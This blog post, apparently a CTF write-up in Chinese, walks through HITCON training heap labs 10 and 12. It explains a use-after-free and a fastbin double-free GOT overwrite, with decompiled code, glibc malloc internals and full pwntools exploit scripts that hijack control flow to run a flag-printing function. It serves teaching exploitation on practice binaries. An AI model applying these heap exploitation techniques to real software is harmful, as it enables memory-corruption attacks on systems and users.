---
layout:     post
title: “hitcon pwn writeUp（二）”
subtitle:   "lab10+堆题开始！ "
date: 2019-08-30 15:32:00
author:     "许大仙"
header-img: "img/post-bg-alitrip.jpg"
catalog: true
tags:
    - CTF
---

## lab10

学了一段how2heap，这是第一次真正意义上的做堆题。

本题是<u>UAF</u>的利用【触发原因：**free后的指针并未置0**】。

### 一.分析过程

首先checksec看保护机制，<u>32-bit程序</u>：

![保护机制](/img/hitcon2/lab10_1.png)

#### 功能分析

运行一下就能感受到，这是个堆题啊。可进行的操作有

>\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-
>
>​       HackNote       
>
>\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-
>
> 1. Add note          
> 2. Delete note       
> 3. Print note        
> 4. Exit              
>
>\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

通过IDA反汇编可以得知，首先是根据输入的操作标号，分别调用`del_note()`，`print_note()`，`add_note()`，`exit(0)`函数。

##### 1.add_note

其中count作为note的计数器，notelist是指针数组，通过分析可以知道该指针是一个结构体指针，其中第一个字段`notelist[i]`为函数指针`print_note_content`，第二个字段`notelist[i]+1`为存储内容。

```go
struct note {//第一个字段malloc(8)，分配8B的空间，存储了4B函数指针（函数的首地址）和4B的content首地址
	void (*printnote)();  
	char *content ;       //第二个字段malloc(size)，存储了note的内容，指向堆块的mem地址
};
```

![add note](/img/hitcon2/lab10_3.png)

其中函数指针对应于

```go
int __cdecl print_note_content(int a1)
{
  return puts(*(const char **)(a1 + 4));
}
```

##### 2.del_note

这里存在两个造成漏洞的因素：

- 有free指向chunk mem指针和notelist[i]，但是未置为NULL。
  - 也就是`*content`还指向存储内容的chunk，但是这个chunk已经放入bin中。
  - 并没有把`*content`和设置为0x00
  - 同理`* notelist[i]`也没有置为0x00，故绕过了`if(notelist[i])`
- 并没有进行`count--`【故绕过了v1<0&&v1>=count】

综合以上两点，会造成UAF[use after free]漏洞。

![add note](/img/hitcon2/lab10_4.png)

##### 3.print_note

![add note](/img/hitcon2/lab10_5.png)

##### 4.magic

这个函数就直接调用了`cat flag`

### 二、攻击思路

函数指针哎！！！还有一个现成的`cat flag`，这显然是想办法利用UAF漏洞将函数指针指向`magic`函数，调用了`print_note`就相当于调用了函数指针指向的函数【magic】，从而实现`cat flag`。

**UAF漏洞的常见效果就是会有两个指向同一个chunk的指针。**

如果我们需要想办法让函数指针不指向`print_note_content`，而是指向`magic()`，那么我们就需要对函数指针的字段进行修改。显然程序本身只有对content的修改，没有对函数指针的修改。

所以我们能想到的是，让<u>noteA的函数指针字段所在的chunk</u>，和<u>noteB的content所在的chunk</u>是**同一个chunk**【利用UAF】。就可以实现对noteB的content写，就是对noteA函数指针的修改。从而调用noteA的函数指针所指向的函数就是调用`magic`。

攻击具体过程为：

- 添加note1，大小为32（不要求是fastbin大小），内容随意
  - 添加一个note，会有两次malloc，得到2个chunk。
  - 一个为8B【实际为（8+4）align 8B = 16B=0x10】
  - 一个为32B【实际为40B=0x28】
- 添加note2，大小为32（不要求是fastbin大小），内容随意
- 添加note3，大小为32（不要求是fastbin大小），内容随意【这一步可以不要，主要是避免和顶块的合并】
- del掉note1
- del掉note2

此时的fast_bin的分布是这样的：

> note2_notelist(8大小)-->-->note1_notelist(8大小)【对齐后16B】
> note2_content(32大小)-->note1_content(32大小**)**

**攻击！**申请note4，size大小为8，内容为magic的函数地址。

- 申请note4的时候首先会申请一个8大小的空间【malloc(8)】作为notelist[4]，这时note2_notelist(8大小)的空间给了这个块。
- 接着再申请size 大小的块作为content，这时note1_notelist(8大小)的空间给了这个块。【此时note4的content所在chunk和note1_notelist所在的chunk为同一个】
  - **但是注意之前的note1、note2、note3的content的大小对齐后，实际大小不等于16，是为了此时分配16B的note4 content时不会被分配到之前的content的bin上，而是分配到notelist的bin上**
  - 将notelist和content的链分开
- 同时向note4 content中写入magic的函数地址，也就相对应向note1_notelist(8大小)写入magic的函数地址
- 对于note1，原本存放puts函数指针的地方被magic函数覆盖了，也就导致了接下来打印note1内容的时候会直接执行magic【调用notelist[1]的第一个字段指向的地址】
- 调用print_note打印note1的内容，执行magic函数【note1在[0,count]的范围内，允许打印】

### 三、EXP

```python
from pwn import *
cn = process("./hacknote")
elf = ELF("./hacknote")

def addNote(size,content):
	cn.recvuntil("Your choice :")
	cn.sendline("1")
	cn.recvuntil("Note size :")
	cn.sendline(size)
	cn.recvuntil("Content :")
	cn.sendline(content)

def delNote(index):
	cn.recvuntil("Your choice :")
	cn.sendline("2")
	cn.recvuntil("Index :")
	cn.sendline(index)


def printNote(index):
	cn.recvuntil("Your choice :")
	cn.sendline("3")
	cn.recvuntil("Index :")
	cn.sendline(index)

addNote("32","note0") #note0
addNote("32","note1") #note1 【不必再add note2了】
delNote("0")
delNote("1")

magic_addr = p32(elf.symbols['magic']) #p32处理后为str类型，p32处理前为int类型
addNote("8",magic_addr) #read note0的函数指针，指向magic
printNote("0")
cn.interactive()
```

![add note](/img/hitcon2/lab10_6.png)

## lab11

这题好像house of force做不成了，暂时搁置

## lab12

这题是考察对fastbin double free的利用方法。

### 一、逆向分析

#### 保护机制情况

![](/img/hitcon2/lab12_1.png)

可以看到这是一个amd64(即x86-64)的二进制程序。

保护机制RELRO(relocation read only)是**默认值（Partial-RELRO）**,即它迫使GOT在内存中的BSS之前出现，消除了利用全局变量（bss）缓冲区溢出覆盖GOT条目的风险。

注：而FULL RELRO将整个GOT设为只读，从而消除了GOT表复写相关的攻击。Full RELRO不是默认的编译器设置，因为它会大大增加程序启动时间，因为在启动程序之前必须先解析所有符号。在具有数千个需要链接的符号的大型程序中，这可能会导致启动时间明显延迟。

由于只是PARTIAL RELRO，因此GOT表是可读可写的。

#### 程序逻辑分析

以下是程序的功能菜单，对应于switch-case语句。

![](/img/hitcon2/lab12_2.png)

##### 1.add()

功能运行情况如下：

![](/img/hitcon2/lab12_3.png)

选择choice为1，输入花名长度5，输入花名daisy，最后输入颜色名white。

通过IDA反汇编得到如下：

```c++
int add()
{
  void *v0; // rsi
  size_t size; // [rsp+0h] [rbp-20h]
  void *s; // [rsp+8h] [rbp-18h]
  void *buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  s = 0LL;                                      // 清空结构体指针s
  buf = 0LL;
  LODWORD(size) = 0;
  if ( (unsigned int)flowercount > 0x63 )       // 最多只能记录0x63朵花
    return puts("The garden is overflow");
  s = malloc(40uLL);                            // 分配40字节作为结构体s
  memset(s, 0, 0x28uLL);                        // 初始化为0【inuse字段初始是0】
  printf("Length of the name :", 0LL, size); 
  if ( (unsigned int)__isoc99_scanf("%u", &size) == -1 )// 以无符号整数输入flowername 的长度，即size
    exit(-1);
  buf = malloc((unsigned int)size);             // malloc(size)用于存储flowername
  if ( !buf )
  {
    puts("Alloca error !!");
    exit(-1);
  }
  printf("The name of flower :", size);
  v0 = buf;
  read(0, buf, (unsigned int)size);             // 通过read从标准输入0读取小于等于size字节到buf chunk中
    //注意：read从一个标准终端读入数据时，tty驱动器会以一次一行的形式向read()提供输入。因此运行到read()时会被挂起，直到tty遇到一个换行符，或者遇到EOF后才将数据提供给read()，继续运行。
    //而对于一般的文件输入，如果要求读入N个字符，那么在有N个字符可供读入的情况下，read()会读入N个字符，如果已经读到文件尾也即EOF，小于N的个数的字符会被读取。
  *((_QWORD *)s + 1) = buf;                     // 结构体s的第二个字段【qword，8字节】存储flowername所在chunk的首地址【64位下8字节地址】
  printf("The color of the flower :", v0, size);
  __isoc99_scanf("%23s", (char *)s + 16);       // 结构体s的第三个字段放color，只允许写入最多23个字节。
                                               
  *(_DWORD *)s = 1;                             // 结构体s的第一个字段设置为1【qword=8字节】，表示in use
// 结构体s共通过malloc(40)分配了40个字节的大小：
// 第一个字段，为qword，存放了inuse标志位【8字节】
// 第二个字段，为qword，存放了flowername chunk的首地址【8字节】
// 第三个字段，允许23个字符表示coloer，再加上1个\0
// 因此8+8+23+1=共40个;符合malloc(40)
  
  // 有0-0x63的flowerlist可以存储结构体s chunk的地址。
  for ( HIDWORD(size) = 0; HIDWORD(size) <= 0x63; ++HIDWORD(size) )
  { // 遍历flowerlist的所有字段是空的就写入结构体s chunk的起始地址
    if ( !*(&flowerlist + HIDWORD(size)) )
    {
      *(&flowerlist + HIDWORD(size)) = s;
      break;
    }
  }
  ++flowercount;                                // flower数量++
  return puts("Successful !");
}
```

通过上述反汇编代码的分析，我们可以得到内存中对flower的存储结构：

![](/img/hitcon2/lab12_4.png)

##### 2.visit()

功能运行情况如下：

![](/img/hitcon2/lab12_5.png)

通过IDA反汇编得到如下：

```c++
int visit()
{
  __int64 v0; // rax
  unsigned int i; // [rsp+Ch] [rbp-4h]

  LODWORD(v0) = flowercount;
  if ( flowercount )                            // 如果flowercount==0，说明没有花
  {
    for ( i = 0; i <= 0x63; ++i )
    {
      v0 = (__int64)*(&flowerlist + i);
      if ( v0 )
      {
        LODWORD(v0) = *(_DWORD *)*(&flowerlist + i);
        if ( (_DWORD)v0 )                       // 如果flowerlist的第一个字段inuse是非空，就可以输出
        {
          printf("Name of the flower[%u] :%s\n", i, *((_QWORD *)*(&flowerlist + i) + 1));// 输出第二个字段：flowername
          LODWORD(v0) = printf("Color of the flower[%u] :%s\n", i, (char *)*(&flowerlist + i) + 16);// 输出第三个字段：color
        }
      }
    }
  }
  else
  {
    LODWORD(v0) = puts("No flower in the garden !");
  }
  return v0;
}
```

这里没有特别的点，只是要注意指针的分析：

`*(_DWORD *)*(&flowerlist + i)`

- \*(&flowerlist + i)：对flowerlist进行偏移，获取flowerlist[i]，得到结构体s的起始地址【即指针】
- \*(_DWORD \*)\*(&flowerlist + i)：即*s，得到结构体s的第一个8字节字段inuse

`*((_QWORD *)*(&flowerlist + i) + 1)`

- (_QWORD \*)\*(&flowerlist + i)：得到指向结构体s的起始地址的指针，转为8字节指针
- (_QWORD \*)\*(&flowerlist + i) + 1：将指针偏移一个单位——8个字节，得到指向第二个字段flowername的指针
- \*((_QWORD \*)\*(&flowerlist + i) + 1)：\*指向第二个字段flowername的指针，即得到flowername的值

`(char *)*(&flowerlist + i) + 16`

- \*(&flowerlist + i)：对flowerlist进行偏移，获取flowerlist[i]，得到结构体s的起始地址
- (char \*)\*(&flowerlist + i)：将指向结构体s的起始地址的指针转为char指针
- (char \*)\*(&flowerlist + i)+16：将char型指向结构体s的起始地址的指针偏移16个单元【16个字节】，指向第三个字段color

##### 3.del()

功能运行情况如下：

![](/img/hitcon2/lab12_6.png)

通过IDA反汇编得到如下：

```c++
int del()
{
  int result; // eax
  unsigned int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( !flowercount )
    return puts("No flower in the garden");
  printf("Which flower do you want to remove from the garden:");
  __isoc99_scanf("%d", &v1);                    // 输入要删除的flower的index
  if ( v1 <= 0x63 && *(&flowerlist + v1) )      // index<0x63【没有判断>0】，且必须是flowerlist[i]中的结构体s地址为非0【没有进行inuse字段的判断】
  {
    *(_DWORD *)*(&flowerlist + v1) = 0;         // 将结构体s的inuse字段置为0
      //注意*(&flowerlist + v1)和 *(_DWORD *)*(&flowerlist + v1)的区别
    free(*((void **)*(&flowerlist + v1) + 1));  // free(flowername chunk)
    result = puts("Successful");                // 没有flowercount--
    //存在的漏洞点：
    //1.没有free(结构体s chunk)，且也没有将flowerlist[i]置为NULL（导致一些free flowername chunk对应的结构体s仍然可以访问，且由于2中flowername chunk没有置为NULL，还是两个chunk都可以访问到）
    //2.虽然free(flowername chunk)，但是没有设置name chunk ptr=NULL【可以再次free这个指针，故导致double free】
    //3.没有flowercount--【使得garden很容易被占满】
  }
  else
  {
    puts("Invalid choice");
    result = 0;
  }
  return result;
}
```

##### 4.clean()

```c++
int clean()
{
  unsigned int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i <= 0x63; ++i )
  {
    if ( *(&flowerlist + i) && !*(_DWORD *)*(&flowerlist + i) )
    {
      free(*(&flowerlist + i));                 // 这里才free(结构体s)
      *(&flowerlist + i) = 0LL;                 // 并且置为NULL
      --flowercount;                            // flowercount-1
    }
  }
  return puts("Done!");
}
```

##### 5.magic()

存在一个`cat flag`函数：

![](/img/hitcon2/lab12_7.png)

### 二、漏洞点利用

主要是思路是利用double free漏洞，实现fastbin dup into got。

通过double free来获得一个got表附近的chunk，然后对这个chunk进行写操作，修改free@got或其他got表项为magic函数的首地址，从而调用free就相当于调用了magic函数，从而得到flag。

#### 获得GOT表附近的chunk

##### 1.获得非heap中chunk的关键思路

heap bin是通过fd和bk进行链接的【除了fastbin是通过fd单向链接的】，也就是说如果修改了fd或者bk，链表就会变化。通过当前chunk找下一个chunk就是看当前chunk的fd，那么如果可以控制一个chunk的fd字段，我就可以把fd指向我所希望的地址A，那么这个A就成功加入list。

而double free恰好提供了得到两个指向同一个chunk的指针的机会。

通过double free构造一个inuse chunk和free chunk，这两个chunk为同一heap chunk。

那么我们可以对一个inuse chunk的用户空间的头8个字节写入free@got表项附近的地址，那么对于还处于bin中的free chunk，就是修改了其fd字段为free@got表项附近的地址，从而链接入了一个got表上的chunk。通过几次malloc就可以把这个got chunk分配出来。

##### 2.绕过检查点

首先来了解一些检查点会涉及到的知识点：

每个分配区（arena，对于单线程程序，可以暂时理解为heap区域和mmap区域）是 struct malloc_state 的一个实例，ptmalloc 使用 malloc_state 来管理分配区。struct malloc_state 的定义如下： 

```c++
struct malloc_state {   /* Serialize access.  */
  /* Flags (formerly in max_fast).  */
   int flags;  //Flags 记录了分配区的一些标志，bit0 用于标识分配区是否包含至少一个 fast bin chunk， bit1 用于标识分配区是否能返回连续的虚拟地址空间。 
 
  /* Fastbins */
  //本题主要涉及这个字段
  //对于每一个分配区，由fastbinsY来存放每个fast chunk链表头指针，fastbinsY拥有 10（NFASTBINS）个元素的数组，所以 fast bins 最多包含 10 个 fast chunk 的单向链表。
    //该数组初始化为0，每个字段存储对应fast bin的最近一个释放的chunk的头指针
    //注意FAST BIN是LIFO，而其他BIN都是FIFO
   mfastbinptr      fastbinsY[NFASTBINS]; 
 
  /* Base of the topmost chunk -- not otherwise kept in a bin */
   mchunkptr        top; 
 
  /* The remainder from the most recent split of a small request */
   mchunkptr        last_remainder; 
 
  /* Normal bins packed as described above */
   mchunkptr        bins[NBINS * 2 - 2]; 
 
  /* Bitmap of bins */
 
  unsigned int     binmap[BINMAPSIZE]; 
 
  /* Linked list */
   struct malloc_state *next; 
   /*……省略了一部分字段*/
  };  
```

fastbin()函数，是根据 fast bin 的 index，获得 fast bin 的地址。其中ar_ptr为分配区指针。

```c++
#define fastbin(ar_ptr, idx) ((ar_ptr)->fastbinsY[idx]) 
```

fastbin_index(sz) 用于获得 fast bin 在 fast bins 数组中的 index，由于 bin[0]和 bin[1]中 的chunk不存在，所以需要减2，对于SIZE_SZ为4B的平台，将sz除以8减2得到fast bin index， 对于 SIZE_SZ 为 8B 的平台，将 sz 除以 16 减去 2 得到 fast bin index。 

```c++
#define fastbin_index(sz) \   ((((unsigned int)(sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2) 
```

###### 检查点①

由于fastbin在free时，会有一些操作来检验是否是double free【free函数-> Public_fREe()->\_int\_free()】，具体如下：

_int_free()函数实现的源代码

```c++
_int_free(mstate av, mchunkptr p) //释放chunk p
{
    /*  …… 此处省略 */
    size = chunksize(p); //获取需要释放的 chunk 的大小。 
    /*  …… 此处省略 */
    set_fastchunks(av); //设置当前分配区的 fast bin flag，表示当前分配区的 fast bins 中已有空闲 chunk。
    unsigned int idx = fastbin_index(size);  //然后根据当前 free 的 chunk 大小获取所属的 fast bin。 
    fb = &fastbin (av, idx); //根据idx获取，对应fast bin的头指针
 
#ifdef ATOMIC_FASTBINS //如果开启了ATOMIC_FASTBINS 优化，使用 lock-free 技术实现 fast bin 的单向链表插入操作     
    mchunkptr fd;     
    mchunkptr old = *fb;//获得fastbinsY[idx]，也就是指向最近一个入该fast bin的chunk的指针     
    unsigned int old_idx = ~0u;    
    do       
    {         
        /* Another simple check: make sure the top of the bin is not the record we are going to add (i.e., double free).  */
        
         if (__builtin_expect (old == p, 0))   //同时需要校验是否为 double free 错误。   
         {   //即如果之前最近释放的chunk【old】和当前释放的chunk p相同，则double free          
             errstr = "double free or corruption (fasttop)";             
             goto errout;           
         } 
        
        if (old != NULL) 
 			old_idx = fastbin_index(chunksize(old));         
        p->fd = fd = old; 
    }while ((old = catomic_compare_and_exchange_val_rel (fb, p, fd)) != fd); 
    //校验表头不为 NULL 情况下，保证表头 chunk 的所属的 fast bin 与当前 free 的 chunk 所属的 fast bin 相同【即old_idx==idx】。
    if (fd != NULL && __builtin_expect (old_idx != idx, 0))       
    {         
        errstr = "invalid fastbin entry (free)"; 
        goto errout;       
    }
    #else //如果没有开启了 ATOMIC_FASTBINS 优化，将 free 的 chunk 加入 fast bin 的单向链表中，修改过链表表头为当前 free 的 chunk。    
    /* Another simple check : make sure the top of the bin is not the
        record we are going to add (i.e., double free).  */
     if (__builtin_expect (*fb == p, 0))       
     {         
         errstr = "double free or corruption (fasttop)";         
         goto errout;       
     }     
    if (*fb != NULL&& __builtin_expect (fastbin_index(chunksize(*fb)) != idx, 0))       
    {        
         errstr = "invalid fastbin entry (free)";
        goto errout;       
    } 
   p->fd = *fb; //将p链入
   *fb = p; 
    
    #endif   
}
```

上述说明，只要不要**连续**两次释放同一块内存就行，比如`free(p1);free(p2);free(p1);`就不会触发double free。

然后连续两次malloc取走p1,p2，此时p1已经被取走，但由于之前double free同时也还留在fastbin list中，就可以对malloc p1中用户区域前8个字节修改，相当于修改了fastbin list中的p1->fd，从而链入chunk到当前fast bin中。

<u>因此触发fast_dup可以进行如下操作：</u>

```python
raiseflower(0x50,"0","red")
raiseflower(0x50,"1","red")
#(0x50 + 8) align 16 = 0x60
remove(0)
remove(1)
remove(0)
# 初始fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
# 第一次remove(del)后：
# fastbin 0x60: chunk 0 
# fastbinsY = {0x0, 0x0, 0x0, 0x0, chunk0头地址, 0x0, 0x0, 0x0, 0x0, 0x0}
# chunk0->fd = 0x0【初始fastbin的字段为0x0，chunk0接入，就让chunk0->fd=0】

# 第二次remove(del)后：
# fastbin 0x60: chunk1 -> chunk 0
# fastbinsY = {0x0, 0x0, 0x0, 0x0, chunk1头地址, 0x0, 0x0, 0x0, 0x0, 0x0}
# chunk0->fd = 0x0,chunk1->fd = chunk0【chunk1接入后fd指向chunk0】

# 第三次remove(del)后：
# fastbin 0x60: chunk0 -> chunk1 -> chunk 0 
# fastbinsY = {0x0, 0x0, 0x0, 0x0, chunk0头地址, 0x0, 0x0, 0x0, 0x0, 0x0}
# chunk0->fd = chunk1【chunk0再次接入后fd指向chunk1】,chunk1->fd = chunk0

#对于fastbin chunk，其bk字段一直保持0x0

#这时候得到一个inuse的chunk0，也一个free的chunk0，通过inuse的chunk0，修改free chunk0的fd字段，链入got chunk。【具体修改成什么呢？继续往下看】
```

此后malloc，会首先返回chunk0，剩余fastbin 0x60: chunk1 -> chunk 0。

###### 检查点②

在把got chunk链入后，还要将这个free got chunk 分配出来，故会涉及到fast bin chunk分配时候的检查。

如果所需的 chunk 大小小于等于 fast bins 中的最大 chunk 大小，首先尝试从 fast bins 中 分配 chunk。源代码如下：

```c++
   /*
     If the size qualifies as a fastbin, first check corresponding bin.
     This code is safe to execute even if av is not yet initialized, so we
     can try it without checking, which saves some time on this fast path.
   */
//当前请求分配的chunk真实大小为nb
//对于SIZE_SZ为8B的平台（64位平台下），fast bins有7个chunk空闲链表（bin），每个bin的chunk大小依次为32B，48B，64B，80B，96B，112B，128B。【公差为2*SIZE_SZ】
   if ((unsigned long)(nb) <= (unsigned long)(get_max_fast ())) { 
       //只有在get_max_fast以内的分配请求，才可以用fast bin来分配的。
       idx = fastbin_index(nb);     
       mfastbinptr* fb = &fastbin (av, idx); 
#ifdef ATOMIC_FASTBINS     
       /*……*/
#else     
       victim = *fb; //LIFO，根据nb获取对应fast bin的第一个chunk
#endif     
       //但是这个victim并不是只要是在这里bin就可以malloc出去了，还要检查这个victim的size是否是满足存在在fastbin的。
       if (victim != 0) {
           //#define chunksize(p)         ((p)->size & ~(SIZE_BITS)) 
           //chunksize(p)获取chunkp的size字段，& ~(SIZE_BITS)剥除了标志位的影响。
           if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))//也就是判断victim的size字段计算得到的idx是否是等于nb计算的idx。         
           {           
               errstr = "malloc(): memory corruption (fast)";         errout:           
               malloc_printerr (check_action, errstr, chunk2mem (victim));           
               return NULL;         
           } 
    /*……*/    
           void *p = chunk2mem(victim); //转换为mem指针再返回给用户      
           if (__builtin_expect (perturb_byte, 0))
               alloc_perturb (p, bytes);       
           return p;
        }   
   }
```

回顾fastbin_index的计算方法：

```c++
#define fastbin_index(sz) \   ((((unsigned int)(sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2) 
//64位平台下相当于：
//((((unsigned int)(sz)) >> 4) - 2) 
```

也就是说，fastbin的size必须和当前的idx满足一定关系（sz+[0,7]），否则是malloc不出来的。【+（0~7），最多占4个bit，恰好会被>>4移走，不影响idx】

实际上是一个unsigned int【unsigned int类型占用4个字节，过多的位会被截取】，也就是说在x64上（假设此时idx为0x20），我们的size的高位不是全要为零，而是`0x????????00000020 + [0,7]`，高4字节是可以任意的。

比如0xffffffff00000023就是可以的。

##### 3.寻找合适的Got chunk位置

我们的目的是修改got表到magic函数，所以**通过fastbin_dup【fast bin的double free】，我们把chunk建在free@got表项前面某个恰当的位置，使得chunk->size的idx满足此前的double free chunk所在的fast bin idx，并且可以覆盖到free@got,将其覆盖为magic函数。**【注意chunk的size要在fast bin的范围内，对于 SIZE_SZ 为 8B 的平台，fast bin chunk小于 128B=0x80】

观察free函数在got的位置为：

![](/img/hitcon2/lab12_8.png)

#### 复写GOT表并触发magic函数

查看got表的情况比如0x601ffa，因为此时的size很恰当。

**由于前面的python脚本，设置的chunk为0x50【可以根据实际情况调整，<=0x80即可】，真实的size为（0x50+8）align 16 = 0x60。**

**而如果以`0x601ffa`作为got chunk头，那么chunk->size=0xe168000000000060，那么(unsigned int)chunk->size = 0x00000060=96，故idx = fastbin_index (chunksize (got chunk)) = 4【从0起，第四个fast bin】。**

把这个got chunk和之前的chunk放在一个fast bin中，合理，绕过检查点2。

> 对于 SIZE_SZ 为 8B 的平台， fast bins 有 7 个 chunk 空闲链表（ bin），每个 bin 的 chunk 大小依
> 次为 32B， 48B， 64B， 80B， 96B， 112B， 128B

![](/img/hitcon2/lab12_9.png)

注意哪个才是高位，哪个才是低位。

```python
# 构造了double free的条件
raiseflower(0x50,"da","red")#0
raiseflower(0x50,"da","red")#1
remove(0)
remove(1)
remove(0)
# 对于 fastbin 0x60: chunk0 -> chunk1 -> chunk 0 
magic = 0x400c7b
fake_chunk = 0x601ffa
raiseflower(0x50,p64(fake_chunk),"blue") # inuse chunk0，修改fd字段为p64(fake_chunk),链入got chunk
raiseflower(0x50,"da","red") #chunk1
raiseflower(0x50,"da","red") #chunk0

#得到got chunk，将magic函数的地址精准的写到free@got处。
#由于got chunk的mem地址为0x60200a，先写6个a，8个0，达到0x602018，再写入p64(magic)。
#从而将free@got修改为magic函数
raiseflower(0x50,"a"*6 + p64(0) + p64(magic)*2 ,"red") # malloc in fake_chunk
```

### 三、EXP

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

r = process('./secretgarden')

def raiseflower(length,name,color):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(color)

def visit():
    r.recvuntil(":")
    r.sendline("2")

def remove(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def clean():
    r.recvuntil(":")
    r.sendline("4")


magic = 0x400c7b
fake_chunk = 0x601ffa
raiseflower(0x50,"da","red")#0
raiseflower(0x50,"da","red")#1
remove(0)
remove(1)
remove(0)
raiseflower(0x50,p64(fake_chunk),"blue")
raiseflower(0x50,"da","red")
raiseflower(0x50,"da","red")

raiseflower(0x50,"a"*6 + p64(0) + p64(magic)*2 ,"red")#malloc in fake_chunk

r.interactive() #交互时调用任何一个涉及到free的操作就可以，比如del功能
```

注：由于libc版本的原因，好像攻击不成功。

## lab13